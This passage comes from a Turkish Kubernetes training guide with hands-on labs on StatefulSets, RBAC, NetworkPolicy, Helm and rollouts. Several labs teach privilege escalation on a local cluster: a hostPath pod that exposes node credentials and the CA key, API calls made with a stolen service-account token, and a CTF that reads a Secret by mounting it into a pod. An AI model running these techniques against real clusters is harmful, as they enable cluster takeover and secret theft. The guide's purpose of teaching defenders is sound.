# Headless Service (StatefulSet için sabit DNS adresi sağlar)
cat > headless-svc.yaml << 'EOF'
apiVersion: v1
kind: Service
metadata:
  name: db-headless
spec:
  selector:
    app: db
  ports:
  - port: 6379
  clusterIP: None  # Headless — DNS doğrudan Pod IP'leri döner
EOF

# StatefulSet (Redis — her Pod'a ayrı PVC)
cat > statefulset.yaml << 'EOF'
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: db
spec:
  serviceName: db-headless
  replicas: 3
  selector:
    matchLabels:
      app: db
  template:
    metadata:
      labels:
        app: db
    spec:
      containers:
      - name: redis
        image: redis:7-alpine
        ports:
        - containerPort: 6379
        volumeMounts:
        - name: data
          mountPath: /data
  volumeClaimTemplates:        # Her Pod için otomatik PVC oluşturur
  - metadata:
      name: data
    spec:
      accessModes: [ReadWriteOnce]
      storageClassName: standard
      resources:
        requests:
          storage: 500Mi
EOF

# Uygula
kubectl apply -f headless-svc.yaml
kubectl apply -f statefulset.yaml

# Sıralı başlamayı izle: önce db-0, sonra db-1, sonra db-2
kubectl get pods -l app=db -w
# db-0 Running → db-1 başlar → db-2 başlar
# Ctrl+C ile çık

# Her Pod'un KENDİ PVC'si var
kubectl get pvc
# data-db-0, data-db-1, data-db-2 — üç ayrı PVC

# Sabit DNS adresi — her Pod'un kendi adresi var
kubectl run test --rm -it --image=nicolaka/netshoot:v0.13 --restart=Never -- nslookup db-0.db-headless
# db-0.db-headless → tek Pod IP döner

# Veri yaz
kubectl exec db-0 -- redis-cli SET mykey "pod0-verisi"
kubectl exec db-0 -- redis-cli GET mykey

# db-1 farklı veri
kubectl exec db-1 -- redis-cli SET mykey "pod1-verisi"
kubectl exec db-1 -- redis-cli GET mykey

# db-0 Pod'unu sil — yerine yeni db-0 gelir, AYNI PVC'ye bağlanır
kubectl delete pod db-0
kubectl get pods -l app=db -w
# db-0 yeniden oluşturulur — bekleyip Ctrl+C

# Veri hala orada! (PVC bağlı kaldı)
kubectl exec db-0 -- redis-cli GET mykey
# "pod0-verisi" döner

# Deployment vs StatefulSet farkını gör:
# - Deployment'da Pod adları rastgele: web-deploy-abc123
# - StatefulSet'te Pod adları sıralı: db-0, db-1, db-2
# - Deployment'da tüm Pod'lar aynı PVC'yi paylaşırdı
# - StatefulSet'te her Pod'un kendi PVC'si var

# Temizlik
kubectl delete -f statefulset.yaml
kubectl delete -f headless-svc.yaml
# StatefulSet silinince PVC'ler OTOMATİK silinmez — manuel sil
kubectl delete pvc -l app=db
```

> **⚠️ StatefulSet ≠ Production Veritabanı:** StatefulSet yalnızca sabit isim, sabit disk ve sıralı başlatma sağlar; replikasyon, otomatik failover, yedek/PITR, sürüm yükseltme ve split-brain koruması **sağlamaz** (bu labdaki 3 Redis birbirinin kopyası değildir — db-0'a yazdığınız `pod0-verisi` db-1'de yoktur, db-1 sadece kendi `pod1-verisi`ni bilir; `kubectl exec db-2 -- redis-cli GET mykey` ise boş döner). Node arızasında pod elle müdahale olmadan başka node'a taşınmaz, bulut diskleri tek zone'a bağlıdır, drain/autoscaler/OOMKill gibi olağan Kubernetes olayları DB için kesinti demektir. Güvenlik açısından DB, uygulamalarla aynı kernel/node saldırı yüzeyini paylaşır ve uyum (PCI-DSS/KVKK) kapsamı tüm cluster'a yayılabilir. **Öneri:** Production'da önce yönetilen DB (RDS, Cloud SQL, Azure Database); Kubernetes zorunluysa olgun bir Operator (CloudNativePG, Percona, Crunchy, Strimzi) + test edilmiş yedek/geri dönüş. Çıplak StatefulSet: dev/test, cache, yeniden üretilebilir veri.

---

### Lab 2.9c — 🔐 hostPath ile Node'a Kaçış

> **Amaç:** "Pod oluşturabilmek" + kısıtlanmamış hostPath = node'un (ve cluster'ın) ele geçirilmesi. Gün 3'te bunu Pod Security Admission ile engelleyeceğiz.

```bash
cd ~/k8s-lab/day2
kubectl create namespace hostpath-demo

cat > hostpath-escape.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-escape
  namespace: hostpath-demo
spec:
  containers:
  - name: shell
    image: busybox:1.36
    command: ["sleep", "3600"]
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /          # node'un KÖK dosya sistemi
EOF

kubectl apply -f hostpath-escape.yaml
kubectl wait --for=condition=Ready pod/hostpath-escape -n hostpath-demo --timeout=60s

# Node'un dosya sistemi pod'un içinde:
kubectl exec -n hostpath-demo hostpath-escape -- ls /host/etc/kubernetes/
kubectl exec -n hostpath-demo hostpath-escape -- ls /host/var/lib/minikube/certs/
# 🔴 admin.conf = cluster-admin kubeconfig'i, ca.key = cluster CA'nın özel anahtarı
#    → saldırgan istediği kimlik için sertifika üretebilir = TÜM CLUSTER ele geçer

# Pod'u silin; YAML dosyasını saklayın (Gün 3 Lab 3.9'da tekrar deneyeceğiz)
kubectl delete pod hostpath-escape -n hostpath-demo
```

---

### Lab 2.10 — RBAC: ServiceAccount, Role, RoleBinding

```bash
cd ~/k8s-lab/day2

# Namespace
kubectl create namespace rbac-demo

# ServiceAccount
kubectl create serviceaccount app-sa -n rbac-demo

# Role — sadece pod okuma
cat > role.yaml << 'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: rbac-demo
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods", "pods/log"]
  verbs: ["get", "list", "watch"]
EOF

kubectl apply -f role.yaml

# RoleBinding
cat > rolebinding.yaml << 'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: app-sa-pod-reader
  namespace: rbac-demo
subjects:
- kind: ServiceAccount
  name: app-sa
  namespace: rbac-demo
roleRef:
  kind: Role
  name: pod-reader
  apiGroup: rbac.authorization.k8s.io
EOF

kubectl apply -f rolebinding.yaml

# Test Pod — app-sa kimliğiyle çalışır (token otomatik mount edilir)
cat > test-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: rbac-test
  namespace: rbac-demo
spec:
  serviceAccountName: app-sa
  containers:
  - name: client
    image: nicolaka/netshoot:v0.13
    command: ["sleep", "3600"]
EOF

kubectl apply -f test-pod.yaml
kubectl wait --for=condition=Ready pod/rbac-test -n rbac-demo --timeout=90s

# Pod'un içine otomatik konan kimlik bilgileri
kubectl exec -n rbac-demo rbac-test -- ls /var/run/secrets/kubernetes.io/serviceaccount/
# ca.crt  namespace  token

# Token bir JWT — içeriğini (payload) okuyalım
kubectl exec -n rbac-demo rbac-test -- sh -c \
  'cut -d. -f2 /var/run/secrets/kubernetes.io/serviceaccount/token | base64 -d 2>/dev/null; echo'
# "sub":"system:serviceaccount:rbac-demo:app-sa" ...

# 🔴 Saldırgan bakış açısı: pod'u ele geçiren biri bu token ile API Server'a doğrudan istek atabilir
API='SA=/var/run/secrets/kubernetes.io/serviceaccount; curl -s --cacert $SA/ca.crt -H "Authorization: Bearer $(cat $SA/token)" -o /dev/null -w "%{http_code}\n"'

kubectl exec -n rbac-demo rbac-test -- sh -c "$API https://kubernetes.default.svc/api/v1/namespaces/rbac-demo/pods"
# 200 → pod listeleme yetkisi var (Role: pod-reader)

kubectl exec -n rbac-demo rbac-test -- sh -c "$API https://kubernetes.default.svc/api/v1/namespaces/rbac-demo/services"
# 403 → services yetkisi yok

kubectl exec -n rbac-demo rbac-test -- sh -c "$API https://kubernetes.default.svc/api/v1/namespaces/rbac-demo/secrets"
# 403 → secrets yetkisi yok ✅

kubectl exec -n rbac-demo rbac-test -- sh -c "$API -X DELETE https://kubernetes.default.svc/api/v1/namespaces/rbac-demo/pods/rbac-test"
# 403 → delete yetkisi yok

kubectl exec -n rbac-demo rbac-test -- sh -c "$API https://kubernetes.default.svc/api/v1/namespaces/kube-system/pods"
# 403 → Role sadece kendi namespace'inde geçerli

# auth can-i ile aynı kontrol (admin olarak, impersonation)
kubectl auth can-i list pods --as=system:serviceaccount:rbac-demo:app-sa -n rbac-demo
kubectl auth can-i delete pods --as=system:serviceaccount:rbac-demo:app-sa -n rbac-demo
kubectl auth can-i --list --as=system:serviceaccount:rbac-demo:app-sa -n rbac-demo

# ✅ API'ye ihtiyacı olmayan uygulamalarda token mount'unu kapatın
kubectl patch serviceaccount app-sa -n rbac-demo -p '{"automountServiceAccountToken": false}'
kubectl delete pod rbac-test -n rbac-demo
kubectl apply -f test-pod.yaml
kubectl wait --for=condition=Ready pod/rbac-test -n rbac-demo --timeout=90s
kubectl exec -n rbac-demo rbac-test -- ls /var/run/secrets/kubernetes.io/serviceaccount/
# No such file or directory → çalınacak token yok

# (rbac-demo namespace'ini silmeyin — Lab 2.10b'de kullanılacak)
```

---

### Lab 2.10b — Gerçek Kullanıcı Senaryosu: Sertifika, kubeconfig, ClusterRole ve ClusterRoleBinding

> **Senaryo:** Geliştirici **ayşe** (`dev-team` grubunda) `rbac-demo` namespace'inde kaynakları görüntüleyebilmeli ama Secret'ları görememeli, başka namespace'lere erişememeli. Ekip ayrıca node listesini görebilmeli.
>
> Kubernetes'te "kullanıcı" nesnesi yoktur — kimlik, cluster CA'nın imzaladığı bir sertifikadan gelir: `CN` = kullanıcı adı, `O` = grup.

```bash
cd ~/k8s-lab/day2

# 1) Özel anahtar + sertifika isteği (CSR)
openssl genrsa -out ayse.key 2048
openssl req -new -key ayse.key -out ayse.csr -subj "/CN=ayse/O=dev-team"

# 2) CSR'ı Kubernetes'e gönder (24 saat geçerli)
cat > ayse-csr.yaml << EOF
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: ayse
spec:
  request: $(base64 < ayse.csr | tr -d '\n')
  signerName: kubernetes.io/kube-apiserver-client
  expirationSeconds: 86400
  usages: ["client auth"]
EOF
kubectl apply -f ayse-csr.yaml
kubectl get csr ayse                       # CONDITION: Pending

# 3) Admin olarak onayla ve imzalı sertifikayı al
kubectl certificate approve ayse
kubectl get csr ayse -o jsonpath='{.status.certificate}' | base64 -d > ayse.crt
openssl x509 -in ayse.crt -noout -subject -enddate

# 4) kubeconfig'e kullanıcı + context ekle
kubectl config set-credentials ayse --client-certificate=ayse.crt --client-key=ayse.key --embed-certs=true
kubectl config set-context ayse@minikube --cluster=minikube --user=ayse --namespace=rbac-demo
kubectl config get-contexts

# 5) Kimlik doğrulandı ama yetki yok
kubectl --context=ayse@minikube get pods
# Error: User "ayse" cannot list resource "pods" ... → Authentication ✅, Authorization ❌

# 6) Hazır "view" ClusterRole'ünü RoleBinding ile SADECE rbac-demo'da ver (ClusterRole + RoleBinding = yeniden kullanım)
kubectl create rolebinding ayse-view --clusterrole=view --user=ayse -n rbac-demo

kubectl --context=ayse@minikube get pods                 # ✅ çalışır
kubectl --context=ayse@minikube get secrets              # ❌ view rolü secret'ları KAPSAMAZ
kubectl --context=ayse@minikube get pods -n kube-system  # ❌ binding sadece rbac-demo'da
kubectl --context=ayse@minikube delete pod rbac-test     # ❌ view salt-okunur

# 7) Node'lar cluster-scoped → ClusterRole + ClusterRoleBinding gerekir (gruba ver)
kubectl create clusterrole node-reader --verb=get,list,watch --resource=nodes
kubectl create clusterrolebinding dev-team-node-reader --clusterrole=node-reader --group=dev-team
kubectl --context=ayse@minikube get nodes                # ✅ grup üyeliği (O=dev-team) sayesinde

# 8) Yetkileri listele
kubectl auth can-i --list --as=ayse --as-group=dev-team -n rbac-demo | head -20

# Admin context'e geri dön
kubectl config use-context minikube
kubectl config current-context
```

> 🔐 **Güvenlik notları**
> - Kubernetes istemci sertifikaları **iptal edilemez** (CRL/OCSP yok). Sertifika sızarsa süresi dolana kadar geçerlidir → `expirationSeconds` kısa tutun; üretimde OIDC (SSO) tercih edin.
> - `O=system:masters` içeren bir sertifika **RBAC'i tamamen atlar** (her zaman cluster-admin) ve iptal edilemez. CSR onaylarken sertifikanın içindeki subject'i (CN/O) kontrol edin: `kubectl get csr <ad> -o jsonpath='{.spec.request}' | base64 -d | openssl req -noout -subject` — `spec.groups` alanı sertifikanın değil, CSR'ı gönderen kullanıcının gruplarını gösterir.
> - Yetkiyi kişilere değil **gruplara** verin; kişi ekipten ayrılınca IdP'den çıkarılması yeterli olsun.

```bash
# Temizlik
kubectl config delete-context ayse@minikube
kubectl config delete-user ayse
kubectl delete csr ayse
kubectl delete clusterrolebinding dev-team-node-reader
kubectl delete clusterrole node-reader
rm -f ayse.key ayse.csr ayse.crt ayse-csr.yaml
kubectl delete namespace rbac-demo
```

---

### Lab 2.10c — 🔐 Bonus: "Pod Oluşturabilen, Secret'ları Okuyabilir"

> **Senaryo:** `dev` ServiceAccount'u sadece pod oluşturup loglarını okuyabiliyor; `get secrets` yetkisi YOK. Hedef: `flag` Secret'ını okumak.

```bash
kubectl create namespace ctf
kubectl create secret generic flag -n ctf --from-literal=flag='FLAG{create-pods-esittir-secret-okuma}'
kubectl create serviceaccount dev -n ctf
kubectl create role pod-creator -n ctf --verb=create,get,list --resource=pods,pods/log
kubectl create rolebinding dev-pod-creator -n ctf --role=pod-creator --serviceaccount=ctf:dev

DEV=(--as=system:serviceaccount:ctf:dev -n ctf)   # dizi (array): bash ve zsh'de aynı çalışır
kubectl auth can-i get secrets "${DEV[@]}"     # no
kubectl get secret flag "${DEV[@]}"            # Forbidden ✅

# Ama dev, secret'ı MOUNT EDEN bir pod oluşturabilir → kubelet secret'ı pod'a koyar
kubectl run steal "${DEV[@]}" --image=busybox:1.36 --restart=Never --overrides='
{"spec":{"containers":[{"name":"steal","image":"busybox:1.36","command":["cat","/s/flag"],
  "volumeMounts":[{"name":"s","mountPath":"/s"}]}],
  "volumes":[{"name":"s","secret":{"secretName":"flag"}}]}}'
sleep 5
kubectl logs steal "${DEV[@]}"
# FLAG{create-pods-esittir-secret-okuma}  🔴

kubectl delete namespace ctf
```

> **Ders:** `create pods` yetkisi, o namespace'teki **tüm Secret'ları ve tüm ServiceAccount'ların yetkilerini** dolaylı olarak verir. Benzer "dolaylı yükselme" yetkileri: `create deployments/jobs/cronjobs`, `pods/exec`, `patch deployments`, `escalate`, `bind`, `impersonate`, `nodes/proxy`. RBAC incelemesinde sadece `secrets` satırlarına bakmak yetmez.

---

### Lab 2.11 — Gün 2 Entegre Uygulama

```bash
cd ~/k8s-lab/day2

# --- Adım 1: Namespace ve SA ---
kubectl create namespace day2-lab
kubectl create serviceaccount lab-sa -n day2-lab
kubectl config set-context --current --namespace=day2-lab

# --- Adım 2: ConfigMap + PVC + Deployment ---
cat > lab-app.yaml << 'EOF'
apiVersion: v1
kind: ConfigMap
metadata:
  name: app-config
data:
  app.properties: |
    color=blue
    mode=production
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: app-data
spec:
  accessModes: [ReadWriteOnce]
  storageClassName: standard
  resources:
    requests:
      storage: 500Mi
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: lab-app
spec:
  replicas: 2
  selector:
    matchLabels:
      app: lab-app
  template:
    metadata:
      labels:
        app: lab-app
    spec:
      serviceAccountName: lab-sa
      containers:
      - name: nginx
        image: nginx:1.25
        ports:
        - containerPort: 80
        volumeMounts:
        - name: config
          mountPath: /etc/app
          readOnly: true
        - name: data
          mountPath: /data
      volumes:
      - name: config
        configMap:
          name: app-config
      - name: data
        persistentVolumeClaim:
          claimName: app-data
EOF

kubectl apply -f lab-app.yaml
kubectl get all

# --- Adım 3: Service + istemci pod ---
kubectl expose deployment lab-app --port=80 --name=lab-svc
kubectl get svc lab-svc
kubectl run client --image=nicolaka/netshoot:v0.13 --labels=role=client -- sleep infinity
kubectl wait --for=condition=Ready pod/client --timeout=120s

# Policy öncesi durum
kubectl exec client -- curl -s -o /dev/null -w "%{http_code}\n" --max-time 3 http://lab-svc         # 200
kubectl exec client -- curl -s -o /dev/null -w "%{http_code}\n" --max-time 5 https://example.com   # 200

# --- Adım 4: NetworkPolicy — sıfır güven ---
cat > lab-netpol.yaml << 'EOF'
# 1) Namespace'te varsayılan: her şey kapalı (ingress + egress)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: day2-lab
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
---
# 2) Tüm pod'lar DNS'e çıkabilir
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns
  namespace: day2-lab
spec:
  podSelector: {}
  policyTypes: [Egress]
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
      podSelector:
        matchLabels:
          k8s-app: kube-dns
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
---
# 3) lab-app'e sadece role=client pod'ları 80/TCP ile gelebilir
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: lab-app-from-client
  namespace: day2-lab
spec:
  podSelector:
    matchLabels:
      app: lab-app
  policyTypes: [Ingress]
  ingress:
  - from:
    - podSelector:
        matchLabels:
          role: client
    ports:
    - protocol: TCP
      port: 80
---
# 4) client sadece lab-app'e çıkabilir
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: client-to-lab-app
  namespace: day2-lab
spec:
  podSelector:
    matchLabels:
      role: client
  policyTypes: [Egress]
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: lab-app
    ports:
    - protocol: TCP
      port: 80
EOF

kubectl apply -f lab-netpol.yaml
kubectl get networkpolicy

# Policy sonrası doğrulama
kubectl exec client -- curl -s -o /dev/null -w "%{http_code}\n" --max-time 3 http://lab-svc         # 200 ✅
kubectl exec client -- curl -s -o /dev/null -w "%{http_code}\n" --max-time 5 https://example.com   # 000 ✅
kubectl run other --rm -i --restart=Never --image=nicolaka/netshoot:v0.13 -- \
  curl -s -o /dev/null -w "%{http_code}\n" --max-time 3 http://lab-svc                             # 000 ✅ (label'ı yok)

# --- Adım 5: RBAC ---
cat > lab-rbac.yaml << 'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: day2-lab
  name: lab-role
rules:
- apiGroups: [""]
  resources: ["pods", "pods/log", "services", "configmaps"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: lab-sa-binding
  namespace: day2-lab
subjects:
- kind: ServiceAccount
  name: lab-sa
  namespace: day2-lab
roleRef:
  kind: Role
  name: lab-role
  apiGroup: rbac.authorization.k8s.io
EOF

kubectl apply -f lab-rbac.yaml

# Doğrula
kubectl auth can-i list pods --as=system:serviceaccount:day2-lab:lab-sa -n day2-lab
kubectl auth can-i delete pods --as=system:serviceaccount:day2-lab:lab-sa -n day2-lab

# --- Adım 6: Her şeyi doğrula ---
kubectl get all,configmap,pvc,networkpolicy,role,rolebinding

# ConfigMap içeriğini Pod'da gör
kubectl exec $(kubectl get pod -l app=lab-app -o jsonpath='{.items[0].metadata.name}') -- cat /etc/app/app.properties

# PVC veri yaz
kubectl exec $(kubectl get pod -l app=lab-app -o jsonpath='{.items[0].metadata.name}') -- sh -c "echo test > /data/check.txt"

# --- Adım 7: Temizlik ---
kubectl config set-context --current --namespace=gun2
kubectl delete namespace day2-lab
```

---

## 10. GÜN 3

### Helm, Güncelleme, İzleme ve Operasyonel Yönetim

---

### Lab 3.0 — Hazırlık: Gün 3 Namespace'i ve Uygulama İmajları

> Kısayol: imaj adımlarının tamamı depoda tek komuttur → `bash ~/k8s-lab/scripts/build-demo-images.sh`

```bash
cd ~/k8s-lab
mkdir -p day3

# Gün 3 çalışma namespace'i
kubectl create namespace gun3
kubectl config set-context --current --namespace=gun3

# Gün 1'de yazdığımız uygulamanın 3 sürümünü üret
cd ~/k8s-lab/day1
docker build -t k8s-demo-app:v1 .
docker build --build-arg APP_VERSION=2.0 -t k8s-demo-app:v2 .
docker build --build-arg APP_VERSION=3.0 --build-arg BROKEN=true -t k8s-demo-app:v3-bad .

# İmajları minikube'e yükle (Yol C'de gerekmez — imajlar zaten minikube içinde)
minikube image load k8s-demo-app:v1
minikube image load k8s-demo-app:v2
minikube image load k8s-demo-app:v3-bad
minikube image ls | grep k8s-demo-app

cd ~/k8s-lab/day3
```

> Kubernetes, `:v1` gibi sabit tag'li imajlarda varsayılan olarak `imagePullPolicy: IfNotPresent` kullanır → node'da imaj varsa registry'ye gitmez.
> 🔐 Üretimde imajı tag yerine **digest** ile (`image: repo/app@sha256:...`) referanslamak, tag'in sonradan değiştirilmesine (tag hijacking) karşı korur.

---

### Lab 3.1 — Helm Repo ve Hazır Chart (podinfo)

```bash
cd ~/k8s-lab/day3

# Helm repo ekle (podinfo: Kubernetes demolarında yaygın kullanılan küçük bir web uygulaması)
helm repo add podinfo https://stefanprodan.github.io/podinfo
helm repo update

# Chart ara, sürümleri gör
helm search repo podinfo
helm search repo podinfo/podinfo --versions | head -5

# Default values indir ve incele
helm show values podinfo/podinfo > podinfo-default-values.yaml
code podinfo-default-values.yaml      # VS Code yoksa: less podinfo-default-values.yaml

# Kendi values dosyanız
cat > my-values.yaml << 'EOF'
replicaCount: 2
ui:
  message: "Merhaba K8s Egitimi - v1"
  color: "#34577c"
resources:
  requests:
    cpu: 10m
    memory: 32Mi
  limits:
    memory: 128Mi
EOF

# 🔐 Kurmadan ÖNCE ne kuracağını görün — bir chart cluster'ınıza ClusterRole dahil her şeyi kurabilir
helm template my-podinfo podinfo/podinfo -f my-values.yaml | grep -E "^kind:|image:"

# Kur
helm install my-podinfo podinfo/podinfo -f my-values.yaml

helm list
helm status my-podinfo
kubectl get all -l app.kubernetes.io/name=my-podinfo

# Tarayıcı: AYRI terminalde
kubectl port-forward svc/my-podinfo 9898:9898
# http://localhost:9898 → "Merhaba K8s Egitimi - v1"

# Upgrade — values değiştir
cat > my-values-v2.yaml << 'EOF'
replicaCount: 3
ui:
  message: "Merhaba K8s Egitimi - v2 (upgrade)"
  color: "#2e7d32"
EOF

helm upgrade my-podinfo podinfo/podinfo -f my-values-v2.yaml
kubectl get pods -l app.kubernetes.io/name=my-podinfo
helm history my-podinfo
# Port-forward'ı yeniden başlatın (eski pod'lar silindiği için bağlantı kopar) → yeni mesaj ve renk

# Rollback
helm rollback my-podinfo 1
helm history my-podinfo
# Port-forward'ı yeniden başlatın → v1 mesajı geri geldi

# 🔐 Helm değerleri nerede saklıyor?
helm get values my-podinfo
kubectl get secrets -l owner=helm
kubectl get secret sh.helm.release.v1.my-podinfo.v1 -o jsonpath='{.data.release}' \
  | base64 -d | base64 -d | gunzip | grep -o '"message":"[^"]*"' | head -2
# Helm her sürümün TÜM values'unu (--set ile verilen şifreler dahil) namespace'teki Secret'larda saklar.
# "get secrets" yetkisi olan herkes okur → şifreleri values'a yazmayın; existingSecret / External Secrets kullanın.

# Temizlik
helm uninstall my-podinfo
```

---

### Lab 3.2 — Kendi Helm Chart Oluşturma

```bash
cd ~/k8s-lab/day3

# Yeni chart oluştur
helm create my-first-chart

# Yapıyı incele
ls -la my-first-chart/
ls -la my-first-chart/templates/

# Chart.yaml
cat my-first-chart/Chart.yaml

# values.yaml
cat my-first-chart/values.yaml

# Deployment template
cat my-first-chart/templates/deployment.yaml

# Template render et (cluster'a göndermeden)
helm template my-first-chart

# Dry-run
helm install test-release my-first-chart --dry-run

# Gerçekten kur
helm install my-app my-first-chart

# Kontrol et
helm list
kubectl get all

# Value değiştirerek upgrade
helm upgrade my-app my-first-chart --set replicaCount=3

# Değişikliği gör
kubectl get pods -l app.kubernetes.io/instance=my-app

# Temizlik
helm uninstall my-app
```

---

### Lab 3.3 — Rolling Update, Probe'lar, Rollback ve Recreate

```bash
cd ~/k8s-lab/day3

cat > rollout-demo.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: rollout-demo
  annotations:
    kubernetes.io/change-cause: "v1: ilk kurulum"
spec:
  replicas: 4
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1          # en fazla 1 fazla pod
      maxUnavailable: 0    # hiçbir an kapasite düşmesin
  selector:
    matchLabels:
      app: rollout-demo
  template:
    metadata:
      labels:
        app: rollout-demo
    spec:
      containers:
      - name: app
        image: k8s-demo-app:v1
        imagePullPolicy: IfNotPresent
        ports:
        - containerPort: 5000
        readinessProbe:          # "trafik almaya hazır mı?" → değilse Service endpoint'inden çıkarılır
          httpGet:
            path: /health
            port: 5000
          initialDelaySeconds: 2
          periodSeconds: 3
        livenessProbe:           # "canlı mı?" → değilse container yeniden başlatılır
          httpGet:
            path: /health
            port: 5000
          initialDelaySeconds: 10
          periodSeconds: 5
          failureThreshold: 3
EOF

kubectl apply -f rollout-demo.yaml
kubectl rollout status deployment/rollout-demo
kubectl expose deployment rollout-demo --port=80 --target-port=5000

# Canlı izle (YENİ terminal):
#   kubectl get pods -l app=rollout-demo -w

# Uygulamayı cluster içinden çağıran kısayol
hit() { kubectl run hit-$RANDOM --rm -i --restart=Never --image=nicolaka/netshoot:v0.13 -- curl -s http://rollout-demo | grep -o "Version: [^<]*"; }
hit     # Version: 1.0

# === v1 → v2 (rolling update) ===
kubectl set image deployment/rollout-demo app=k8s-demo-app:v2
kubectl annotate deployment/rollout-demo kubernetes.io/change-cause="v2: yeni ozellik" --overwrite
kubectl rollout status deployment/rollout-demo
kubectl rollout history deployment/rollout-demo
hit     # Version: 2.0

# === Hatalı sürüm: v3-bad (/health → 500) ===
kubectl set image deployment/rollout-demo app=k8s-demo-app:v3-bad
kubectl annotate deployment/rollout-demo kubernetes.io/change-cause="v3: hatali surum" --overwrite
kubectl rollout status deployment/rollout-demo --timeout=45s
# Rollout TAKILIR: yeni pod READY 0/1 kalır (readiness başarısız).
# maxUnavailable=0 olduğu için eski v2 pod'ları silinmez → kullanıcılar etkilenmez:
kubectl get pods -l app=rollout-demo
kubectl describe pods -l app=rollout-demo | grep -i "probe failed" | head -3
hit     # hala Version: 2.0 ✅

# === Rollback ===
kubectl rollout undo deployment/rollout-demo
kubectl rollout status deployment/rollout-demo
kubectl rollout history deployment/rollout-demo

# Belirli bir revision'a dönüş
kubectl rollout history deployment/rollout-demo --revision=1
kubectl rollout undo deployment/rollout-demo --to-revision=1
kubectl rollout status deployment/rollout-demo
hit     # Version: 1.0

# === Recreate stratejisi ===
kubectl patch deployment rollout-demo -p '{"spec":{"strategy":{"type":"Recreate","rollingUpdate":null}}}'
kubectl get deployment rollout-demo -o jsonpath='{.spec.strategy}'; echo
kubectl set image deployment/rollout-demo app=k8s-demo-app:v2
# İzleme terminalinde: TÜM pod'lar önce Terminating, sonra yeniler oluşur → arada KESİNTİ (downtime)

# Temizlik
kubectl delete deployment rollout-demo
kubectl delete svc rollout-demo
```

> 🔐 Probe endpoint'leri (`/health`) kimlik doğrulamasız çalışır; iç bilgileri (versiyon, bağımlılık durumu, hata mesajı) dışarı sızdırmamalı ve Ingress ile dışarıya açılmamalıdır.

---

### Lab 3.4 — Blue-Green Deployment Simülasyonu

```bash
cd ~/k8s-lab/day3

kubectl create namespace bluegreen

# Blue: v1, mavi arka plan
kubectl create deployment app-blue --image=k8s-demo-app:v1 -n bluegreen
kubectl set env deployment/app-blue APP_COLOR=lightblue -n bluegreen

# Green: v2, yeşil arka plan
kubectl create deployment app-green --image=k8s-demo-app:v2 -n bluegreen
kubectl set env deployment/app-green APP_COLOR=lightgreen -n bluegreen

kubectl get pods -n bluegreen

# Service — başlangıçta blue'ya
cat > bg-svc.yaml << 'EOF'
apiVersion: v1
kind: Service
metadata:
  name: app-svc
  namespace: bluegreen
spec:
  selector:
    app: app-blue
  ports:
  - port: 80
    targetPort: 5000
EOF

kubectl apply -f bg-svc.yaml

# Cluster içinden test
kubectl run t1 --rm -i --restart=Never -n bluegreen --image=nicolaka/netshoot:v0.13 -- curl -s http://app-svc
# background:lightblue ... Version: 1.0

# Tarayıcı (AYRI terminal): kubectl port-forward -n bluegreen svc/app-svc 8080:80
# http://localhost:8080 → MAVİ sayfa, Version 1.0

# Green'e geç — selector'ı değiştir
kubectl patch svc app-svc -n bluegreen -p '{"spec":{"selector":{"app":"app-green"}}}'

kubectl run t2 --rm -i --restart=Never -n bluegreen --image=nicolaka/netshoot:v0.13 -- curl -s http://app-svc
# background:lightgreen ... Version: 2.0

# Tarayıcı: port-forward'ı yeniden başlatın (port-forward bağlandığı pod'a sabitlenir) → YEŞİL sayfa, Version 2.0

# Geri dönüş = selector'ı tekrar blue yapmak — anında
kubectl patch svc app-svc -n bluegreen -p '{"spec":{"selector":{"app":"app-blue"}}}'

# Temizlik
kubectl delete namespace bluegreen
```

---

### Lab 3.5 — Resource Requests ve Limits

```bash
cd ~/k8s-lab/day3

# Resource tanımlı Pod
cat > resource-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: resource-pod
spec:
  containers:
  - name: stress
    image: busybox:1.36
    command: ["sleep", "3600"]
    resources:
      requests:
        cpu: 100m
        memory: 128Mi
      limits:
        cpu: 200m
        memory: 256Mi
EOF

kubectl apply -f resource-pod.yaml

# Kaynak tanımını gör
kubectl describe pod resource-pod | grep -A 8 -i "Resources\|Limits\|Requests"

# Metrics
kubectl top pod resource-pod

# OOM testi — memory limit aşımı
cat > oom-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: oom-pod
spec:
  containers:
  - name: memory-hog
    image: python:3.11-slim
    # 300 MB bellek ayırıp doldurur — limit 128Mi
    command: ["python", "-c", "x = b'a' * (300 * 1024 * 1024); import time; time.sleep(3600)"]
    resources:
      requests:
        memory: 64Mi
      limits:
        memory: 128Mi
EOF

kubectl apply -f oom-pod.yaml

# İzle: Running → OOMKilled → CrashLoopBackOff (Ctrl+C ile çık)
kubectl get pod oom-pod -w

# OOMKilled kanıtı
kubectl describe pod oom-pod | grep -iE "reason|exit code"
